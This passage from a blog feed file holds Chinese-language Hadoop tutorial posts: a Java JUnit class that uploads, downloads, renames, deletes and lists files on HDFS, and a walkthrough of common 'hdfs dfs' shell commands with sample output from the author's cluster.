&#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="3-7-全部代码"><a href="#3-7-全部代码" class="headerlink" title="3.7 全部代码"></a>3.7 全部代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.hdfs;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.*;</span><br><span class="line"><span class="keyword">import</span> org.junit.After;</span><br><span class="line"><span class="keyword">import</span> org.junit.Before;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 11:35 2022/12/15</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> FileSystem fileSystem;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Before</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> URISyntaxException, IOException, InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 获取文件系统</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        configuration.set(<span class="string">&quot;dfs.replication&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// Ctrl + F 提升作用域</span></span><br><span class="line">        fileSystem = FileSystem.get(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;hdfs://hadoop100:8020&quot;</span>), configuration, <span class="string">&quot;ghost&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        fileSystem.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyFromLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 上传文件</span></span><br><span class="line">        fileSystem.copyFromLocalFile(<span class="literal">false</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\lol.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/lol/lol.txt&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testCopyToLocalFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        fileSystem.copyToLocalFile(<span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/jinguo&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\&quot;</span>), <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testMv</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 修改文件名称</span></span><br><span class="line">        <span class="comment">// fileSystem.rename(new Path(&quot;/jinguo/weiguo.txt&quot;),new Path(&quot;/jinguo/wuguo.txt&quot;));</span></span><br><span class="line">        <span class="comment">// 移动并修改文件名称(目标地址目录必须存在)</span></span><br><span class="line">        fileSystem.rename(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/jinguo/shuguo.txt&quot;</span>), <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/sanguo/wangguo.txt&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDelete</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// fileSystem.delete(new Path(&quot;/sanguo&quot;), true);</span></span><br><span class="line">        fileSystem.delete(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/jinguo/wuguo.txt&quot;</span>), <span class="literal">true</span>);  <span class="comment">// 仅删除文件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testFileInfo</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空目录会跳过</span></span><br><span class="line">        RemoteIterator&lt;LocatedFileStatus&gt; remoteIterator = fileSystem.listFiles(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/&quot;</span>), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (remoteIterator.hasNext()) &#123;</span><br><span class="line">            <span class="type">LocatedFileStatus</span> <span class="variable">fileStatus</span> <span class="operator">=</span> remoteIterator.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;======&quot;</span> + fileStatus.getPath() + <span class="string">&quot;======&quot;</span>);</span><br><span class="line">            System.out.println(fileStatus.getPermission());</span><br><span class="line">            System.out.println(fileStatus.getOwner());</span><br><span class="line">            System.out.println(fileStatus.getGroup());</span><br><span class="line">            System.out.println(fileStatus.getLen());</span><br><span class="line">            System.out.println(fileStatus.getModificationTime());</span><br><span class="line">            System.out.println(fileStatus.getReplication());</span><br><span class="line">            System.out.println(fileStatus.getBlockSize());</span><br><span class="line">            System.out.println(fileStatus.getPath().getName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取块信息</span></span><br><span class="line">            BlockLocation[] blockLocations = fileStatus.getBlockLocations();</span><br><span class="line">            System.out.println(Arrays.toString(blockLocations));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testListStatus</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> FileStatus[] fileStatuses = fileSystem.listStatus(<span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;/&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (FileStatus fileStatus : fileStatuses) &#123;</span><br><span class="line">            <span class="comment">// 如果是文件</span></span><br><span class="line">            <span class="keyword">if</span> (fileStatus.isFile()) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;file:&quot;</span> + fileStatus.getPath().getName());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;dir:&quot;</span> + fileStatus.getPath().getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS shell操作</title>
      <link href="/blog/d3bc9b59.html/"/>
      <url>/blog/d3bc9b59.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：基本语法"><a href="#一：基本语法" class="headerlink" title="一：基本语法"></a>一：基本语法</h1><ul><li>hadoop fs 具体命令</li><li>hdfs dfs 具体命令</li><li>两者是完全相同的！</li></ul><h1 id="二：命令大全"><a href="#二：命令大全" class="headerlink" title="二：命令大全"></a>二：命令大全</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ hdfs dfs</span><br><span class="line">Usage: hadoop fs [generic options]</span><br><span class="line">[-appendToFile &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">[-cat [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">[-checksum [-v] &lt;src&gt; ...]</span><br><span class="line">[-chgrp [-R] GROUP PATH...]</span><br><span class="line">[-chmod [-R] &lt;MODE[,MODE]... | OCTALMODE&gt; PATH...]</span><br><span class="line">[-chown [-R] [OWNER][:[GROUP]] PATH...]</span><br><span class="line">[-concat &lt;target path&gt; &lt;src path&gt; &lt;src path&gt; ...]</span><br><span class="line">[-copyFromLocal [-f] [-p] [-l] [-d] [-t &lt;thread count&gt;] [-q &lt;thread pool queue size&gt;] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">[-copyToLocal [-f] [-p] [-crc] [-ignoreCrc] [-t &lt;thread count&gt;] [-q &lt;thread pool queue size&gt;] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">[-count [-q] [-h] [-v] [-t [&lt;storage type&gt;]] [-u] [-x] [-e] [-s] &lt;path&gt; ...]</span><br><span class="line">[-cp [-f] [-p | -p[topax]] [-d] [-t &lt;thread count&gt;] [-q &lt;thread pool queue size&gt;] &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">[-createSnapshot &lt;snapshotDir&gt; [&lt;snapshotName&gt;]]</span><br><span class="line">[-deleteSnapshot &lt;snapshotDir&gt; &lt;snapshotName&gt;]</span><br><span class="line">[-df [-h] [&lt;path&gt; ...]]</span><br><span class="line">[-du [-s] [-h] [-v] [-x] &lt;path&gt; ...]</span><br><span class="line">[-expunge [-immediate] [-fs &lt;path&gt;]]</span><br><span class="line">[-find &lt;path&gt; ... &lt;expression&gt; ...]</span><br><span class="line">[-get [-f] [-p] [-crc] [-ignoreCrc] [-t &lt;thread count&gt;] [-q &lt;thread pool queue size&gt;] &lt;src&gt; ... &lt;localdst&gt;]</span><br><span class="line">[-getfacl [-R] &lt;path&gt;]</span><br><span class="line">[-getfattr [-R] &#123;-n name | -d&#125; [-e en] &lt;path&gt;]</span><br><span class="line">[-getmerge [-nl] [-skip-empty-file] &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">[-head &lt;file&gt;]</span><br><span class="line">[-help [cmd ...]]</span><br><span class="line">[-ls [-C] [-d] [-h] [-q] [-R] [-t] [-S] [-r] [-u] [-e] [&lt;path&gt; ...]]</span><br><span class="line">[-mkdir [-p] &lt;path&gt; ...]</span><br><span class="line">[-moveFromLocal [-f] [-p] [-l] [-d] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">[-moveToLocal &lt;src&gt; &lt;localdst&gt;]</span><br><span class="line">[-mv &lt;src&gt; ... &lt;dst&gt;]</span><br><span class="line">[-put [-f] [-p] [-l] [-d] [-t &lt;thread count&gt;] [-q &lt;thread pool queue size&gt;] &lt;localsrc&gt; ... &lt;dst&gt;]</span><br><span class="line">[-renameSnapshot &lt;snapshotDir&gt; &lt;oldName&gt; &lt;newName&gt;]</span><br><span class="line">[-rm [-f] [-r|-R] [-skipTrash] [-safely] &lt;src&gt; ...]</span><br><span class="line">[-rmdir [--ignore-fail-on-non-empty] &lt;dir&gt; ...]</span><br><span class="line">[-setfacl [-R] [&#123;-b|-k&#125; &#123;-m|-x &lt;acl_spec&gt;&#125; &lt;path&gt;]|[--set &lt;acl_spec&gt; &lt;path&gt;]]</span><br><span class="line">[-setfattr &#123;-n name [-v value] | -x name&#125; &lt;path&gt;]</span><br><span class="line">[-setrep [-R] [-w] &lt;rep&gt; &lt;path&gt; ...]</span><br><span class="line">[-stat [format] &lt;path&gt; ...]</span><br><span class="line">[-tail [-f] [-s &lt;sleep interval&gt;] &lt;file&gt;]</span><br><span class="line">[-test -[defswrz] &lt;path&gt;]</span><br><span class="line">[-text [-ignoreCrc] &lt;src&gt; ...]</span><br><span class="line">[-touch [-a] [-m] [-t TIMESTAMP (yyyyMMdd:HHmmss) ] [-c] &lt;path&gt; ...]</span><br><span class="line">[-touchz &lt;path&gt; ...]</span><br><span class="line">[-truncate [-w] &lt;length&gt; &lt;path&gt; ...]</span><br><span class="line">[-usage [cmd ...]]</span><br><span class="line"></span><br><span class="line">Generic options supported are:</span><br><span class="line">-conf &lt;configuration file&gt;        specify an application configuration file</span><br><span class="line">-D &lt;property=value&gt;               define a value for a given property</span><br><span class="line">-fs &lt;file:///|hdfs://namenode:port&gt; specify default filesystem URL to use, overrides &#x27;fs.defaultFS&#x27; property from configurations.</span><br><span class="line">-jt &lt;local|resourcemanager:port&gt;  specify a ResourceManager</span><br><span class="line">-files &lt;file1,...&gt;                specify a comma-separated list of files to be copied to the map reduce cluster</span><br><span class="line">-libjars &lt;jar1,...&gt;               specify a comma-separated list of jar files to be included in the classpath</span><br><span class="line">-archives &lt;archive1,...&gt;          specify a comma-separated list of archives to be unarchived on the compute machines</span><br><span class="line"></span><br><span class="line">The general command line syntax is:</span><br><span class="line">command [genericOptions] [commandOptions]</span><br></pre></td></tr></table></figure><h1 id="三：常用命令实操"><a href="#三：常用命令实操" class="headerlink" title="三：常用命令实操"></a>三：常用命令实操</h1><h2 id="3-1-准备工作"><a href="#3-1-准备工作" class="headerlink" title="3.1 准备工作"></a>3.1 准备工作</h2><ul><li><p>启动 Hadoop 集群</p></li><li><p>-help：查看对应命令的解释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ hdfs dfs -help du</span><br><span class="line">-du [-s] [-h] [-v] [-x] &lt;path&gt; ... :</span><br><span class="line">  Show the amount of space, in bytes, used by the files that match the specified</span><br><span class="line">  file pattern. The following flags are optional:</span><br><span class="line">                                                                                 </span><br><span class="line">  -s  Rather than showing the size of each individual file that matches the      </span><br><span class="line">      pattern, shows the total (summary) size.                                   </span><br><span class="line">  -h  Formats the sizes of files in a human-readable fashion rather than a number</span><br><span class="line">      of bytes.                                                                  </span><br><span class="line">  -v  option displays a header line.                                             </span><br><span class="line">  -x  Excludes snapshots from being counted.                                     </span><br><span class="line">  </span><br><span class="line">  Note that, even without the -s option, this only shows size summaries one level</span><br><span class="line">  deep into a directory.</span><br><span class="line">  </span><br><span class="line">  The output is in the form </span><br><span class="line">  sizedisk space consumedname(full path)</span><br></pre></td></tr></table></figure></li><li><p>创建 &#x2F;sanguo 文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 ~]$ hdfs dfs -mkdir /sanguo</span><br></pre></td></tr></table></figure><p><a href="http://hadoop100:9870/explorer.html#/">Browsing HDFS</a></p></li></ul><h2 id="3-2-上传"><a href="#3-2-上传" class="headerlink" title="3.2 上传"></a>3.2 上传</h2><h3 id="（1）-moveFromLocal：从本地剪切粘贴到-HDFS"><a href="#（1）-moveFromLocal：从本地剪切粘贴到-HDFS" class="headerlink" title="（1）-moveFromLocal：从本地剪切粘贴到 HDFS"></a>（1）-moveFromLocal：从本地剪切粘贴到 HDFS</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 tmp]$ hdfs dfs -moveFromLocal ./shuguo.txt /sanguo</span><br></pre></td></tr></table></figure><h3 id="（2）-copyFromLocal：从本地文件系统中拷贝文件到-HDFS-路径去"><a href="#（2）-copyFromLocal：从本地文件系统中拷贝文件到-HDFS-路径去" class="headerlink" title="（2）-copyFromLocal：从本地文件系统中拷贝文件到 HDFS 路径去"></a>（2）-copyFromLocal：从本地文件系统中拷贝文件到 HDFS 路径去</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 tmp]$ hdfs dfs -copyFromLocal ./shuguo2.txt /sanguo</span><br></pre></td></tr></table></figure><h3 id="（3）-put：等同于-copyFromLocal，生产环境更习惯用-put"><a href="#（3）-put：等同于-copyFromLocal，生产环境更习惯用-put" class="headerlink" title="（3）-put：等同于 copyFromLocal，生产环境更习惯用 put"></a>（3）-put：等同于 copyFromLocal，生产环境更习惯用 put</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 tmp]$ hdfs dfs -put ./weiguo.txt /sanguo</span><br></pre></td></tr></table></figure><h3 id="（4）-appendToFile：追加一个文件到已经存在的文件末尾"><a href="#（4）-appendToFile：追加一个文件到已经存在的文件末尾" class="headerlink" title="（4）-appendToFile：追加一个文件到已经存在的文件末尾"></a>（4）-appendToFile：追加一个文件到已经存在的文件末尾</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 tmp]$ hdfs dfs -appendToFile ./wuguo.txt /sanguo/shuguo2.txt</span><br></pre></td></tr></table></figure><h2 id="3-3-下载"><a href="#3-3-下载" class="headerlink" title="3.3 下载"></a>3.3 下载</h2><h3 id="（1）-copyToLocal：从HDFS拷贝到本地"><a href="#（1）-copyToLocal：从HDFS拷贝到本地" class="headerlink" title="（1）-copyToLocal：从HDFS拷贝到本地"></a>（1）-copyToLocal：从HDFS拷贝到本地</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -copyToLocal /sanguo/shuguo.txt ./</span><br></pre></td></tr></table></figure><h3 id="（2）-get：等同于-copyToLocal，生产环境惯用"><a href="#（2）-get：等同于-copyToLocal，生产环境惯用" class="headerlink" title="（2）-get：等同于 -copyToLocal，生产环境惯用"></a>（2）-get：等同于 -copyToLocal，生产环境惯用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -get /sanguo/shuguo2.txt ./</span><br></pre></td></tr></table></figure><h2 id="3-4-HDFS-直接操作"><a href="#3-4-HDFS-直接操作" class="headerlink" title="3.4  HDFS 直接操作"></a>3.4  HDFS 直接操作</h2><h3 id="（1）-ls-显示目录信息"><a href="#（1）-ls-显示目录信息" class="headerlink" title="（1）-ls: 显示目录信息"></a>（1）-ls: 显示目录信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -ls /</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - ghost supergroup          0 2022-12-14 19:15 /sanguo</span><br><span class="line">drwxrwx---   - ghost supergroup          0 2022-12-14 15:24 /tmp</span><br></pre></td></tr></table></figure><h3 id="（2）-cat：显示文件内容"><a href="#（2）-cat：显示文件内容" class="headerlink" title="（2）-cat：显示文件内容"></a>（2）-cat：显示文件内容</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -cat /sanguo/shuguo.txt</span><br><span class="line">shuguo</span><br></pre></td></tr></table></figure><h3 id="（3）-chgrp、-chmod、-chown：Linux-文件系统中的用法一样，修改文件所属权限"><a href="#（3）-chgrp、-chmod、-chown：Linux-文件系统中的用法一样，修改文件所属权限" class="headerlink" title="（3）-chgrp、-chmod、-chown：Linux 文件系统中的用法一样，修改文件所属权限"></a>（3）-chgrp、-chmod、-chown：Linux 文件系统中的用法一样，修改文件所属权限</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -chown ghost:ghost /sanguo/shuguo.txt</span><br></pre></td></tr></table></figure><h3 id="（4）-mkdir：创建路径"><a href="#（4）-mkdir：创建路径" class="headerlink" title="（4）-mkdir：创建路径"></a>（4）-mkdir：创建路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -mkdir /jinguo</span><br></pre></td></tr></table></figure><h3 id="（5）-cp：从-HDFS-的一个路径拷贝到-HDFS-的另一个路径"><a href="#（5）-cp：从-HDFS-的一个路径拷贝到-HDFS-的另一个路径" class="headerlink" title="（5）-cp：从 HDFS 的一个路径拷贝到 HDFS 的另一个路径"></a>（5）-cp：从 HDFS 的一个路径拷贝到 HDFS 的另一个路径</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs  -cp /sanguo/* /jinguo</span><br></pre></td></tr></table></figure><h3 id="（6）-mv：在-HDFS-目录中移动文件"><a href="#（6）-mv：在-HDFS-目录中移动文件" class="headerlink" title="（6）-mv：在 HDFS 目录中移动文件"></a>（6）-mv：在 HDFS 目录中移动文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -mv /sanguo /jinguo</span><br></pre></td></tr></table></figure><h3 id="（7）-tail：显示一个文件的末尾-1kb-的数据"><a href="#（7）-tail：显示一个文件的末尾-1kb-的数据" class="headerlink" title="（7）-tail：显示一个文件的末尾 1kb 的数据"></a>（7）-tail：显示一个文件的末尾 1kb 的数据</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -tail /jinguo/weiguo.txt</span><br></pre></td></tr></table></figure><h3 id="（8）-rm：删除文件或文件夹"><a href="#（8）-rm：删除文件或文件夹" class="headerlink" title="（8）-rm：删除文件或文件夹"></a>（8）-rm：删除文件或文件夹</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -rm /sanguo/shuguo2.txt</span><br></pre></td></tr></table></figure><h3 id="（9）-rm-r：递归删除目录及目录里面内容"><a href="#（9）-rm-r：递归删除目录及目录里面内容" class="headerlink" title="（9）-rm -r：递归删除目录及目录里面内容"></a>（9）-rm -r：递归删除目录及目录里面内容</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">jinguo 文件夹也被删除</span></span><br><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -rm -r /jinguo/</span><br></pre></td></tr></table></figure><h3 id="（10）-du-统计文件夹的大小信息"><a href="#（10）-du-统计文件夹的大小信息" class="headerlink" title="（10）-du 统计文件夹的大小信息"></a>（10）-du 统计文件夹的大小信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -du /jinguo</span><br><span class="line">7  21  /jinguo/shuguo.txt</span><br><span class="line">7  21  /jinguo/weiguo.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看总容量</span></span><br><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -du -s /jinguo</span><br><span class="line">14  42  /jinguo</span><br></pre></td></tr></table></figure><h3 id="（11）-setrep：设置-HDFS-中文件的副本数量"><a href="#（11）-setrep：设置-HDFS-中文件的副本数量" class="headerlink" title="（11）-setrep：设置 HDFS 中文件的副本数量"></a>（11）-setrep：设置 HDFS 中文件的副本数量</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ghost@hadoop100 sanguo]$ hdfs dfs -setrep 2 /jinguo/weiguo.txt</span><br></pre></td></tr></table></figure><p>这里设置的副本数只是记录在 NameNode 的元数据中，是否真的会有这么多副本，还得 看 DataNode 的数量。因为目前只有 3 台设备，最多也就 3 个副本，只有节点数的增加到 10 台时，副本数才能达到 10。同一份副本一个节点上只会存一份！</p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDFS 概述</title>
      <link href="/blog/5e263552.html/"/>
      <url>/blog/5e263552.html/</url>
      
